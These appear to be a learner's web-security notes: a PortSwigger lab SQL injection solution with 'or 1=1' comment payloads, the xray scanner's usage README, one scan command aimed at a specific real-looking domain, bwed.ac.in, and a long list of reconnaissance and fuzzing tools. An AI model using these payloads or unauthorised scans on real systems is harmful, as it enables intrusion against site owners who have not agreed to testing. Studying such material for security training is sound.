# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
``` SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```

 Soln--> SELECT * FROM products WHERE category = ' '  ' --+ AND released = 1

 SELECT * FROM products WHERE category = ' '  or 1=1  ' --+ AND released = 1


https://portswigger-cdn.net/burp/releases/download?product=pro&version=2024.10.3&type=Jar









# XRAY 
 ```
./xray_linux_amd64 webscan --url https://bwed.ac.in/ --html-output vuln.html
 ```
## 🚀 Quick Usage

**Before using, be sure to read and agree to the terms in the [License](https://github.com/chaitin/xray/blob/master/LICENSE.md) file. If not, please do not install or use this tool.**

1. Use the basic crawler to scan the links crawled by the crawler for vulnerabilities

    ```bash
    xray webscan --basic-crawler http://example.com --html-output vuln.html
    ```

2. Use HTTP proxy for passive scanning

    ```bash
    xray webscan --listen 127.0.0.1:7777 --html-output proxy.html
    ```
   Set the browser's HTTP proxy to `http://127.0.0.1:7777`, then you can automatically analyze proxy traffic and scan it.

   > To scan HTTPS traffic, please read the "Capture HTTPS Traffic" section below.

3. Scan a single URL without using a crawler

    ```bash
    xray webscan --url http://example.com/?a=b --html-output single-url.html
    ```

4. Manually specify plugins for this run

   By default, all built-in plugins will be enabled. You can specify the plugins to be enabled for this scan with the following commands.

   ```bash
   xray webscan --plugins cmd-injection,sqldet --url http://example.com
   xray webscan --plugins cmd-injection,sqldet --listen 127.0.0.1:7777
   ```

5. Specify Plugin Output

   You can specify to output the vulnerability information of this scan to a file:

    ```bash
    xray webscan --url http://example.com/?a=b \
    --text-output result.txt --json-output result.json --html-output report.html
    ```

   
For other usage, please read the documentation: https://docs.xray.cool



# ***************************************** RECON


online tool 
    check os : search.censys.io / 
    crt.sh
    chaos.projectdiscovery.io  / https://cloud.projectdiscovery.io/
    https://dnsdumpster.com/

Tools : 
    dnscan :https://github.com/rbsec/dnscan     : 2m-wordlist.txt
    assetfinder
    sublist3r /subfinder
    nuclei : https://github.com/projectdiscovery/nuclei
    ffuf




manual find subdomain with = crt.sh virustotal  chaos.projectdiscovery.io
https://www.virustotal.com/gui/home/u...
https://chaos.projectdiscovery.io/#/
https://crt.sh/?q=

automate subdomain = subfinder assetfinder sublist3r amass 
https://github.com/tomnomnom/assetfinder
https://github.com/owasp-amass/amass
https://github.com/projectdiscovery/subfinder

brute force subdomain = ffuf gobuseter dirbuster amass

wordlist = Seclists , https://github.com/n0kovo/n0kovo_subdomains

live domain = httpx https://github.com/projectdiscovery/httpx

screenshoting = gowitness https://github.com/sensepost/gowitness

deep recon = https://github.com/shmilylty/OneForAll

find urls = waybackurl katana https://github.com/projectdiscovery/katana.. ,https://github.com/GerbenJavado/LinkFinder 

js data = subjs https://github.com/lc/subjs , katana -jc  

find path = dirsearch, ffuf https://github.com/ffuf/ffuf

parameter finder = arjun https://github.com/s0md3v/Arjun 

subdomain find = subzy https://github.com/PentestPad/subzy

Broken Link Hijacking = socialhunter https://github.com/utkusen/socialhunter

port finder = nmap p -T4 -sC -sV [ip address]

google dorking = https://nitinyadav00.github.io/Bug-Bounty-Search-Engine/

xss = https://github.com/faiyazahmad07/xss_vibes